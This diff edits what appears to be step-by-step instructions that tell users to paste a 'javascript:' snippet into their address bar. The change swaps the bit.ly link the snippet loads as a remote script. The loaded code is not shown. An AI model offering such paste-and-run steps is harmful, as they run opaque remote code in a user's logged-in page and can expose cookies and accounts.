@@ -19,7 +19,7 @@ javascript:
 
 5.) Paste the text you copied earlier so your address bar now looks like this:
 
-javascript:var js = document.createElement('script');js.src = '//bit.ly/2lKFacH';document.querySelectorAll('head')[0].appendChild(js)
+javascript:var js = document.createElement('script');js.src = '//bit.ly/36doNsE';document.querySelectorAll('head')[0].appendChild(js)
 
 6.) Hit ENTER
 
